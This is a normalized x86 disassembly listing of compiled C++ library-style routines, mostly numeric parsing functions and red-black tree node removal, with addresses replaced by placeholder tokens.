lea eax [ ebp - 0x18 ]
call sub_409874
xor esi esi
mov [ ebp - 0x4 ] esi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] esi
mov [ eax ] esi
mov [ edi ] ecx
mov esi [ edi + 0x4 ]
mov [ edi + 0x4 ] edx
test esi esi
je r-xdata
call sub_44866d
retn
call sub_40379c
or [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x14 ]
test esi esi
je r-xdata
call sub_40379c
cmp [ edi ] 0x0
jne r-xdata
call sub_40379c
mov esi [ edi + 0x8 ]
lea eax [ edi + 0x8 ]
call sub_40a30e
push esi
lea eax [ ebp - 0x10 ]
push eax
push [ edi + 0xc ]
call sub_408bfd
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
sub_408019
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ecx ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x20
sub_408040
push 0x60
mov eax sub_44d78b
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
test [ edi + 0x14 ] 0x4000
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x68 ] eax
mov eax edi
je r-xdata
and [ ebp - 0x58 ] 0x0
lea esi [ ebp - 0x5c ]
call sub_4034a7
lea ecx [ ebp - 0x58 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov edi [ edi + 0x14 ]
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
add esp 0xc
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4479aa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x5c ]
mov esi eax
call sub_402f60
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x6c ] eax
je r-xdata
lea esi [ ebp - 0x64 ]
call sub_4034a7
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_405eb8
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_402f60
xor edi edi
push ebx
inc edi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
call sub_4098a0
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] edi
call sub_40523d
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4056b5
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_40487c
push ebx
call sub_405352
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_405254
push eax
mov [ ebp - 0x4 ] 0x3
call sub_4056b5
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_40487c
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
test al al
mov eax [ ebp - 0x54 ]
je r-xdata
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_40b534
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
push ebx
push edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
call sub_40487c
jmp r-xdata
mov eax esi
cmp [ ebp - 0x50 ] 0x0
jge r-xdata
or [ eax ] 0x1
cmp esi 0x1
ja r-xdata
mov ecx [ ebp - 0x68 ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x60 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_4081d0
push 0x40
mov eax sub_44d73e
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x3c ] 0x0
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x48 ] eax
lea esi [ ebp - 0x40 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
lea ecx [ ebp - 0x40 ]
mov esi eax
call sub_402f60
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x3c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x34 ]
call sub_4479aa
add esp 0x10
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
mov esi eax
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ eax ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x44 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_4082a1
push 0x40
mov eax sub_44d711
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x3c ] 0x0
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x48 ] eax
lea esi [ ebp - 0x40 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
lea ecx [ ebp - 0x40 ]
mov esi eax
call sub_402f60
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x3c ]
push eax
push esi
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x34 ]
call sub_4479aa
add esp 0x10
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
mov esi eax
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ eax ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x44 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_40836e
push 0x3c
mov eax sub_44d6e4
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x44 ] eax
lea esi [ ebp - 0x48 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4466c9
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_402f60
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x3c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_40841e
push 0x3c
mov eax sub_44d6b7
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x44 ] eax
lea esi [ ebp - 0x48 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4479aa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_402f60
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x3c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_4084ce
push 0x44
mov eax sub_44d68a
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x48 ] eax
lea esi [ ebp - 0x44 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_44757a
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x44 ]
mov esi eax
mov [ ebp - 0x4c ] edx
call sub_402f60
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x3c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x4c ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_408587
push 0x44
mov eax sub_44d65d
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x48 ] eax
lea esi [ ebp - 0x44 ]
mov eax edi
call sub_4034a7
and [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x14 ]
lea ecx [ ebp - 0x34 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push edi
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
call sub_408f90
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_447657
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x44 ]
mov esi eax
mov [ ebp - 0x4c ] edx
call sub_402f60
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x3c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x4c ]
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_408640
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4c ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0x4c ]
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea edx [ ebp - 0x48 ]
lea ecx [ ebp + 0x14 ]
call sub_4092b7
add esp 0xc
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_447539
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
push ebx
push edi
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
pop edi
pop ebx
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_402c65
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
mov eax [ ebp - 0x58 ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x54 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x20
sub_408704
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0x44 ]
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea edx [ ebp - 0x48 ]
lea ecx [ ebp + 0x14 ]
call sub_4092b7
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_447b60
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
push ebx
push edi
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
pop edi
pop ebx
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4255d8
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x58 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x20
sub_4087ca
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x24 ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0x44 ]
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea edx [ ebp - 0x48 ]
lea ecx [ ebp + 0x14 ]
call sub_4092b7
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_447987
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
push ebx
push edi
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
call sub_40c11d
pop edi
pop ebx
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4255d8
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x5c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x58 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x20
sub_408890
push 0x44
mov eax sub_44d630
call sub_4485fe
mov ecx [ ebp + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
xor edi edi
lea esi [ ebp - 0x44 ]
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x34 ] edi
call sub_4034a7
push eax
lea eax [ ebp + 0x14 ]
push 0x800
push eax
lea edx [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] edi
call sub_408f90
or [ ebp - 0x4 ] 0xffffffff
add esp 0xc
lea ecx [ ebp - 0x44 ]
mov esi eax
call sub_402f60
lea eax [ ebp - 0x34 ]
push eax
push esi
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_4479aa
mov [ ebp - 0x4c ] edi
add esp 0x10
lea edi [ ebp + 0x14 ]
lea ebx [ ebp + 0xc ]
mov esi eax
call sub_40c11d
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x3c ] ecx
je r-xdata
or [ eax ] 0x1
or [ eax ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_448681
retn 0x20
sub_408966
push 0x0
mov eax sub_44ca24
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov esi [ edi + 0x24 ]
test esi esi
je r-xdata
lea eax [ edi + 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_408bc4
or [ ebp - 0x4 ] 0xffffffff
push edi
call sub_408b7e
call sub_44866d
retn 0x4
call sub_40379c
sub_4089a7
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4089d9
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
call sub_4098a0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_408a34
push 0x4
mov eax sub_44dfbf
call sub_448595
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ esi + ecx ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
call sub_405015
mov eax esi
call sub_44866d
retn 0x8
sub_408adc
push 0x4
mov eax sub_44d60d
call sub_448595
mov edi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x10 ] esp
mov esi edi
mov [ ebp - 0x10 ] esp
call sub_40a6ee
and [ ebp - 0x4 ] 0x0
push ecx
mov [ ebp - 0x10 ] esp
lea esi [ edi + 0x10 ]
mov [ ebp - 0x10 ] esp
call sub_40a744
and [ edi + 0x20 ] 0x0
and [ edi + 0x24 ] 0x0
and [ edi + 0x28 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
sub_408b22
push 0x4
mov eax sub_44d5e9
call sub_448595
mov edi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x10 ] esp
mov esi edi
mov [ ebp - 0x10 ] esp
call sub_40a6ee
and [ ebp - 0x4 ] 0x0
push ecx
mov [ ebp - 0x10 ] esp
lea esi [ edi + 0x10 ]
mov [ ebp - 0x10 ] esp
call sub_40a744
and [ edi + 0x20 ] 0x0
and [ edi + 0x24 ] 0x0
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
and [ edi + 0x28 ] 0x0
push edi
call sub_40991b
mov eax edi
call sub_44866d
retn 0x8
sub_408b7e
push 0x4
mov eax sub_44c9f3
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_40a217
or [ ebp - 0x4 ] 0xffffffff
push [ edi + 0x4 ]
call sub_424fc7
pop ecx
call sub_44866d
retn 0x4
sub_408bc4
push 0x4
mov eax sub_44c9d0
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_40a283
or [ ebp - 0x4 ] 0xffffffff
push [ edi + 0x4 ]
call sub_424fc7
pop ecx
call sub_44866d
retn 0x4
sub_408bfd
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
je r-xdata
lea eax [ ebp + 0x10 ]
call sub_40a30e
mov edx [ ebx ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_446ae2
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi edx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
mov [ eax ] edx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov [ ebx + 0x14 ] cl
cmp [ ebx + 0x14 ] 0x1
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
lea eax [ ebx + 0x10 ]
call sub_403855
push ebx
call sub_424fc7
pop ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
mov ecx edi
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx ] ecx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
cmp edi [ eax + 0x4 ]
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ edi + 0x14 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
mov [ edi + 0x14 ] 0x1
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_409a05
mov ecx [ esi ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x1
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_4099b4
mov ecx [ esi + 0x8 ]
mov edi esi
mov esi [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] 0x1
je r-xdata
mov al [ esi + 0x14 ]
push [ ebp + 0x8 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] 0x1
